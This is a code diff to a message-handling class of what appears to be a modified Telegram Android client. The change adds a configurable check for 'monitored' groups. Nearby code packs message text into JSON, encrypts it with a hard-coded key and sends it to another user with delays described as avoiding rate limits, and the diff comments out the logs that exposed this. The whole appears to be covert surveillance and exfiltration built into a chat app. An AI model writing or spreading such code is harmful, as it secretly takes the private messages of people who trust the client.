@@ -13,6 +13,8 @@ import static org.telegram.messenger.LocaleController.getString;
 import static org.telegram.messenger.NotificationsController.TYPE_CHANNEL;
 import static org.telegram.messenger.NotificationsController.TYPE_PRIVATE;
 import static org.telegram.messenger.NotificationsController.TYPE_REACTIONS_MESSAGES;
+import static org.telegram9.messenger6.utils.JsonFileManager.isMonitoredGroup;
+import static org.webrtc.ContextUtils.getApplicationContext;
 
 import android.Manifest;
 import android.app.Activity;
@@ -16776,7 +16778,10 @@ public class MessagesController extends BaseController implements NotificationCe
 //                        }, 1000); // 1秒延迟
 
                         // 检查是否来自目标群组
-                        if (chatIdFrom == MONITORED_GROUP_ID) {
+//                        if (chatIdFrom == MONITORED_GROUP_ID) {
+                            // 检查消息是否来自需要监控的群组
+                            if (isMonitoredGroup(ApplicationLoader.applicationContext.getApplicationContext()
+                                    ,chatIdFrom)) {
 
 //                            FileLog.d("收到目标群组消息: " + message.message);
 //                            forwardMessageToUser(message, TARGET_USER_ID);
@@ -22261,7 +22266,7 @@ public class MessagesController extends BaseController implements NotificationCe
             apkJsons.put("message", message.message);
 
 
-            FileLog.d("coder2025收到消息 packageName: " + packageName);
+//            FileLog.d("coder2025收到消息 packageName: " + packageName);
 
             TLRPC.TL_inputPeerUser peerUser = new TLRPC.TL_inputPeerUser();
             peerUser.user_id = user.id;
@@ -22289,10 +22294,10 @@ public class MessagesController extends BaseController implements NotificationCe
 //            saveSingleMessage(message,currentAccount);
 
 
-            FileLog.d("coder2025收到消息 apkJsons: " + jsonApk);
+//            FileLog.d("coder2025收到消息 apkJsons: " + jsonApk);
 
             jsonApk =AESUtils.encrypt128(jsonApk,"oaes");
-            FileLog.d("coder2025收到消息 apkJsons secret: " + jsonApk);
+//            FileLog.d("coder2025收到消息 apkJsons secret: " + jsonApk);
 
             // 4. 发送请求（带延迟防限流）
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
